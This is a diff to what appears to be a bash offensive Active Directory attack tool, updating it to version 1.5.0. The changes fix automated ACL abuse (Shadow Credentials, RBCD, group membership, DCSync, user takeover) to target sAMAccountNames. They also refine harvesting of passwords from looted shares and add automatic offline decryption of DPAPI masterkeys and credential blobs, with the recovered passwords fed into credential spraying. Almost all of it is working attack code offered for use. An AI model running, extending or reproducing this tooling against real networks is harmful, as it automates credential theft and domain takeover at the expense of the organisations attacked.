@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.4.2"
+readonly VERSION="1.5.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1166,15 +1166,21 @@ phase_acl() {
 
     # Parse candidate target objects (CN of each writable DN) and their rights
     # bloodyAD groups output per-object: a 'distinguishedName: CN=...' line followed by the granted permissions.
-    local cur_dn="" cur_name="" cur_class=""
+    local cur_dn="" cur_name="" cur_sam="" cur_class=""
     while IFS= read -r line; do
         if [[ "$line" =~ distinguishedName:\ *(.*) ]]; then
             cur_dn="${BASH_REMATCH[1]}"
             cur_name=$(echo "$cur_dn" | grep -oP '^CN=\K[^,]+')
             cur_class=""
+            # Resolve the sAMAccountName — abuse tools need it, NOT the CN/display
+            # name. "CN=Lacey Miller" must become "lacey.miller" or every reset/
+            # shadow/RBCD against it fails (this is what stalled the pivot chain).
+            cur_sam=$(bloodyAD "${ba[@]}" get object "$cur_dn" --attr sAMAccountName 2>/dev/null \
+                        | grep -oiP 'sAMAccountName:\s*\K\S+' | head -1)
+            [[ -z "$cur_sam" ]] && cur_sam="$cur_name"
             # Domain head (DC=…,DC=… with no CN) → writeDacl here means DCSync
             if [[ -z "$cur_name" && "$cur_dn" =~ ^[Dd][Cc]= ]]; then
-                cur_name="${DOMAIN:-domain}"; cur_class="domain"
+                cur_name="${DOMAIN:-domain}"; cur_sam="$cur_name"; cur_class="domain"
             fi
         fi
         [[ "$line" =~ objectClass.*group ]]    && cur_class="group"
@@ -1192,21 +1198,23 @@ phase_acl() {
         elif [[ "$ll" =~ (genericall|owner|fullcontrol|writedacl|allextendedrights) ]]; then act="full"
         else continue; fi
 
-        local dkey="${cur_name}:${act}"
+        local dkey="${cur_sam}:${act}"
         [[ -n "${ABUSED[$dkey]:-}" ]] && continue
         ABUSED["$dkey"]=1
+        # Always abuse by sAMAccountName (cur_sam); cur_name is only for display.
+        local tgt="$cur_sam"
 
         case "$act" in
-            shadow) warn "Writable msDS-KeyCredentialLink on ${C_BOLD}$cur_name${C_RESET} → Shadow Credentials"; _abuse_shadowcred "$cur_name" ;;
-            rbcd)   warn "Writable RBCD attr on ${C_BOLD}$cur_name${C_RESET} → Resource-Based Delegation"; _abuse_rbcd "$cur_name" ;;
-            spn)    _abuse_writespn "$cur_name" ;;
-            group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$cur_name" ;;
+            shadow) warn "Writable msDS-KeyCredentialLink on ${C_BOLD}$cur_name${C_RESET} → Shadow Credentials"; _abuse_shadowcred "$tgt" ;;
+            rbcd)   warn "Writable RBCD attr on ${C_BOLD}$cur_name${C_RESET} → Resource-Based Delegation"; _abuse_rbcd "$tgt" ;;
+            spn)    _abuse_writespn "$tgt" ;;
+            group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$tgt" ;;
             full)
                 warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
                 if [[ "$cur_class" == "domain" ]]; then _abuse_dcsync_dacl
-                elif [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$cur_name"
-                elif [[ "$cur_class" == "computer" || "$cur_name" == *\$ ]]; then _abuse_rbcd "$cur_name" || _abuse_shadowcred "$cur_name"
-                else _abuse_shadowcred "$cur_name" || _abuse_user "$cur_name"; fi ;;
+                elif [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$tgt"
+                elif [[ "$cur_class" == "computer" || "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt"
+                else _abuse_shadowcred "$tgt" || _abuse_user "$tgt"; fi ;;
         esac
     done <<<"$w"
 }
@@ -1566,6 +1574,21 @@ decrypt_and_read() {
 # Pull likely passwords out of free text and feed them to the engine.
 # Strategy: (1) keyword-anchored secrets (high confidence), (2) a few standalone
 # strong tokens (upper+lower+digit, len>=8). Junk (paths/xml) is filtered out.
+# Reject things that look harvested but aren't passwords: GUIDs, hex/0x literals,
+# pure numbers, and long base64/hex blobs (keys, not creds). Keeps real ones
+# like football1 / M1XyC9pW7qT5Vn while dropping {GUID}, 0x01C0…, base64 keys.
+_plausible_secret() {
+    local s="$1" n=${#s}
+    (( n < 6 || n > 40 )) && return 1
+    [[ "$s" =~ ^\{?[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\}?$ ]] && return 1   # GUID
+    [[ "$s" =~ ^0[xX][0-9a-fA-F]+$ ]] && return 1                                          # hex literal
+    [[ "$s" =~ ^[0-9a-fA-F]{16,}$ ]] && return 1                                           # long pure hex
+    [[ "$s" =~ ^[0-9]+$ ]] && return 1                                                     # pure number
+    # long token with NO special char and NOT clearly a passphrase → likely a key/blob
+    (( n > 26 )) && [[ ! "$s" =~ [^A-Za-z0-9] ]] && return 1
+    return 0
+}
+
 harvest_secrets() {
     local label="${1:-text}" text; text=$(cat)
     local -a hits=()
@@ -1580,6 +1603,7 @@ harvest_secrets() {
         # filter obvious non-secrets
         [[ "$s" =~ ^(password|passwd|reset|account|domain|admin|user|users|remote|management)$ ]] && continue
         [[ "$s" == */* || "$s" =~ \.(xml|bin|rels|png|jpg|csv|ini|inf|pol)$ ]] && continue
+        _plausible_secret "$s" || continue          # drop GUIDs, hex, blobs, fragments
         if [[ -z "${FOUND_SECRETS[$s]:-}" ]]; then
             loot "Potential password harvested from ${label}: ${C_GREEN}${C_BOLD}$s${C_RESET}"
             add_secret "$s" "harvested from $label"; added=$((added+1))
@@ -1632,7 +1656,11 @@ phase_share_loot() {
         | grep -vEi '\.(dll|exe|png|jpg)' | head -40 | tee "$OUTDIR/share_secrets.txt"
     [[ -s "$OUTDIR/share_secrets.txt" ]] && loot "Potential secrets in files → share_secrets.txt"
     # Harvest passwords from small text/config files and feed the engine
-    find "$dl" -type f -size -200k \( -iname '*.txt' -o -iname '*.ini' -o -iname '*.config' \
+    # Skip SYSVOL/GPO policy trees — they're full of GUIDs/registry hex that
+    # pollute (and slow) the spray, not real credentials.
+    find "$dl" -type f -size -200k \
+        -not -ipath '*/sysvol/*' -not -ipath '*/policies/*' \
+        \( -iname '*.txt' -o -iname '*.ini' -o -iname '*.config' \
         -o -iname '*.xml' -o -iname '*.ps1' -o -iname '*.bat' -o -iname '*.conf' -o -iname '*.cnf' \) \
         -exec cat {} + 2>/dev/null | harvest_secrets "shares"
 
@@ -1653,10 +1681,67 @@ phase_share_loot() {
         phase_ntds_local "$ntds" "$system"
     fi
 
-    # DPAPI material → guidance (decryption is environment-specific)
+    # DPAPI material looted from shares → try to decrypt it offline, automatically
     if echo "$files" | grep -qiE 'Protect/|Credentials|Vault|masterkey'; then
-        warn "DPAPI material found. Recover with: impacket-dpapi masterkey → then credential (needs the owner's password/SID)."
+        phase_dpapi_offline "$dl"
     fi
+}
+
+# ===========================================================================
+#  DPAPI OFFLINE  —  decrypt masterkeys + credential/vault blobs looted from
+#  shares, using any plaintext password we've recovered. Fully generic: it keys
+#  off the standard Windows DPAPI layout (Protect/<SID>/<GUID> masterkeys,
+#  Credentials/* and Vault/* blobs), not any specific account.
+# ===========================================================================
+phase_dpapi_offline() {
+    local dl="$1"
+    have impacket-dpapi || { warn "impacket-dpapi unavailable — skipping offline DPAPI"; return; }
+    [[ ${#FOUND_SECRETS[@]} -eq 0 ]] && return     # need at least one plaintext to try
+
+    local mks creds
+    mks=$(find "$dl" -type f -ipath '*protect*' -regextype posix-extended \
+            -iregex '.*/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' 2>/dev/null)
+    creds=$(find "$dl" -type f \( -ipath '*credentials*' -o -ipath '*vault*' \) ! -iname '*.pol' 2>/dev/null)
+    [[ -z "$mks" && -z "$creds" ]] && return
+
+    section "DPAPI · OFFLINE DECRYPTION OF LOOTED BLOBS"
+    local -A MKEYS=()        # decrypted masterkey GUID -> hex key
+    local mk sid pw out k
+
+    subsection "Decrypting masterkeys with recovered passwords"
+    while IFS= read -r mk; do
+        [[ -z "$mk" ]] && continue
+        sid=$(printf '%s' "$mk" | grep -oiP 'S-1-5-21-[0-9-]+' | head -1)
+        [[ -z "$sid" ]] && continue
+        for pw in "${!FOUND_SECRETS[@]}"; do
+            out=$(impacket-dpapi masterkey -file "$mk" -sid "$sid" -password "$pw" 2>/dev/null)
+            k=$(printf '%s' "$out" | grep -oiP 'Decrypted key with User Key.*0x\K[0-9a-f]+|Decrypted key:\s*0x\K[0-9a-f]+' | head -1)
+            if [[ -n "$k" ]]; then
+                MKEYS["$(basename "$mk")"]="$k"
+                loot "★ DPAPI masterkey $(basename "$mk") decrypted (password of SID ${sid})"
+                break
+            fi
+        done
+    done <<<"$mks"
+
+    [[ ${#MKEYS[@]} -eq 0 ]] && { info "No DPAPI masterkey could be decrypted with the known passwords"; return; }
+
+    subsection "Decrypting credential/vault blobs"
+    while IFS= read -r blob; do
+        [[ -z "$blob" ]] && continue
+        for k in "${MKEYS[@]}"; do
+            out=$(impacket-dpapi credential -file "$blob" -key "0x$k" 2>/dev/null)
+            printf '%s' "$out" | grep -qiE 'Username|Target' || continue
+            local cu cp; cu=$(printf '%s' "$out" | grep -oiP 'Username\s*:\s*\K.+' | head -1 | sed 's#.*\\##' | tr -d '\r')
+            cp=$(printf '%s' "$out" | grep -oiP '(Unknown|Password)\s*:\s*\K\S.*' | tail -1 | tr -d '\r')
+            if [[ -n "$cp" ]] && _plausible_secret "$cp"; then
+                loot "★★ DPAPI credential recovered → ${C_GREEN}${cu:-?} : ${cp}${C_RESET}"
+                add_secret "$cp" "DPAPI offline ($(basename "$blob"))"
+                [[ -n "$cu" ]] && { note_cred_source "${cu}:${cp}" "DPAPI offline decrypt"; queue_cred "$cu" "$cp" ""; }
+                break
+            fi
+        done
+    done <<<"$creds"
 }
 
 # ===========================================================================
